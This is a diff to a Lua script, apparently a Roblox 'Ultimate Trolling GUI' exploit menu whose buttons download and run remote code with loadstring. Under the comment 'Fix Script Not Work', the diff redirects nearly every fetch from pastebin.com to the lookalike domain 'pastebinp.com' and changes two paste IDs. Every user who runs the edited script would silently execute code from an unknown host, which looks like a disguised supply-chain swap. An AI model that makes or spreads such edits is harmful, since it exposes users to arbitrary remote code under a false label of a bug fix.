@@ -1,4 +1,5 @@
 -- UTG Version 3 made by Blukez
+-- Fix Script Not Work
 
 local UltimateTrollingGuiV3 = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
@@ -1420,35 +1421,35 @@ coroutine.wrap(NJGRIXS_fake_script)()
 
 
 Sonic.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/SyF5t70A"))()
 end)
 
 Gale.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/PjJNLaFa", true))()
+	loadstring(game:HttpGet("https://pastebinp.com/raw/PjJNLaFa", true))()
 end)
 
 AmongUs.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/JXUMavf3", true))()
+	loadstring(game:HttpGet("https://pastebinp.com/raw/JXUMavf3", true))()
 end)
 
 KillBot.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/G24tcRXA"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/G24tcRXA"))()
 end)
 
 NekoMaid.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://paste.ee/d/6bCwm/0"))()
+	loadstring(game:HttpGetAsync("https://paste.ee/d/iCtCM/0"))()
 end)
 
 SmugDance.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZuKy7HFF"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/ZuKy7HFF"))()
 end)
 
 ShadowBlade.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/kMYThpNG"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/kMYThpNG"))()
 end)
 
 FishingRod.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Wp8C1bi7"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/Wp8C1bi7"))()
 end)
 
 SwordStand.MouseButton1Click:Connect(function()
@@ -1456,63 +1457,63 @@ SwordStand.MouseButton1Click:Connect(function()
 end)
 
 NeptunionV.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/t0Mkc33N"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/t0Mkc33N"))()
 end)
 
 RbNeptunion.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/gDi503fB"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/gDi503fB"))()
 end)
 
 Wall.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AY6kA2AV"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/AY6kA2AV"))()
 end)
 
 AchromaticGlitcher.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/T7cmny7C"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/T7cmny7C"))()
 end)
 
 FlamingCube.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/D7pigANg"))()
+	loadstring(game:HttpGet("https://pastebinp.com/raw/D7pigANg"))()
 end)
 
 Spider.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/txsk1LJg"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/txsk1LJg"))()
 end)
 
 Cop.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/VAA5Mf60"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/VAA5Mf60"))()
 end)
 
 Chips.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/b289ts36"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/b289ts36"))()
 end)
 
 Joy.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/LEAQuKj0"))()
 end)
 
 UltimateMemeDance.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/0QfjMKrF"))()
 end)
 
 Chill.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/0QfjMKrF"))()
 end)
 
 WallWalk.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/RY9cBbdG"))()
 end)
 
 Grapple.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AyASkDEG"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/AyASkDEG"))()
 end)
 
 KrystalDance.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/FV3HLmTH"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/FV3HLmTH"))()
 end)
 
 Stand.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RZUwatYV"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/RZUwatYV"))()
 end)
 
 ServerAdmin.MouseButton1Click:Connect(function()
@@ -1524,31 +1525,31 @@ BanHammer.MouseButton1Click:Connect(function()
 end)
 
 ParkourGod.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xwmnPkvY"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/xwmnPkvY"))()
 end)
 
 Sniper.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/dtz7qGBg"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/dtz7qGBg"))()
 end)
 
 Ender.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/bndCgupK"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/bndCgupK"))()
 end)
 
 VrSword.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/M9pnqjtn"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/M9pnqjtn"))()
 end)
 
 Caducus.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/jfryBKds"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/jfryBKds"))()
 end)
 
 ElioBlasio.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xvBXu6Yc"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/xvBXu6Yc"))()
 end)
 
 Minigun.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/sK9EUPE6"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/sK9EUPE6"))()
 end)
 
 Car.MouseButton1Click:Connect(function()
@@ -1556,59 +1557,59 @@ Car.MouseButton1Click:Connect(function()
 end)
 
 Carnage.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet('https://pastebin.com/raw/Ntg4PB33',true))()
+	loadstring(game:HttpGet('https://pastebinp.com/raw/Ntg4PB33',true))()
 end)
 
 SegsDoll.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet('https://pastebin.com/raw/dB6DGBB6',true))()
+	loadstring(game:HttpGet('https://pastebinp.com/raw/dB6DGBB6',true))()
 end)
 
 Memeus.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/cCMJ9C82"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/cCMJ9C82"))()
 end)
 
 Pen.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1qcpeuDm"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/1qcpeuDm"))()
 end)
 
 Xester.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/RPwyPvEi"))()
 end)
 
 Broomstick.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xyHiNwtg"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/xyHiNwtg"))()
 end)
 
 Headless.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/mssZBy9j"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/mssZBy9j"))()
 end)
 
 HeadHold.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/jsZHrVFf"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/jsZHrVFf"))()
 end)
 
 Goopie.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/fKLm580i"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/fKLm580i"))()
 end)
 
 OrangeJustice.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Efg0DgkP"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/Efg0DgkP"))()
 end)
 
 Floss.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/JfyvWHLf"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/JfyvWHLf"))()
 end)
 
 DistractDance.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/2tJBN38N"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/2tJBN38N"))()
 end)
 
 RussainKick.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1P37qYeV"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/1P37qYeV"))()
 end)
 
 InsanityPowers.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ygWAZh5A"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/ygWAZh5A"))()
 end)
 
 Zen.MouseButton1Click:Connect(function()
@@ -1616,65 +1617,65 @@ Zen.MouseButton1Click:Connect(function()
 end)
 
 HellRobotics.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/cF4yBbWs"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/cF4yBbWs"))()
 end)
 
 Pillow.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RbKLMpdt"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/RbKLMpdt"))()
 end)
 
 Pp.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/MMDGHMq1"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/MMDGHMq1"))()
 end)
 
 RainbowKing.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Xfxx4qJ0"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/Xfxx4qJ0"))()
 end)
 
 TouchKill.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/KaYHHvh7"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/KaYHHvh7"))()
 end)
 
 TakeTheL.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/VkWkuyzc"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/VkWkuyzc"))()
 end)
 
 BlackHole.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/4zY4XvvA"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/4zY4XvvA"))()
 end)
 
 JhonDoe.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/DwhVGxTs"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/DwhVGxTs"))()
 end)
 
 Neko.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZbuaiGg5"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/7i7CsTPe"))()
 end)
 
 Boobs.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/8ASG9gWB"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/8ASG9gWB"))()
 end)
 
 Rtx.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ba5A2mXj"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/Ba5A2mXj"))()
 end)
 
 VR.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/uZWAvTxC"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/uZWAvTxC"))()
 end)
 
 Gun.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0Jv3udmi"))()	
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/0Jv3udmi"))()	
 end)
 
 Titain.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet('https://pastebin.com/raw/qSMz7Uiu',true))()	
+	loadstring(game:HttpGet('https://pastebinp.com/raw/qSMz7Uiu',true))()	
 end)
 
 PixelCar.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1Nmes8yC"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/1Nmes8yC"))()
 end)
 
 Eggdog.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGetAsync("https://pastebin.com/raw/rkAD6D4J"))()
+	loadstring(game:HttpGetAsync("https://pastebinp.com/raw/rkAD6D4J"))()
 end)
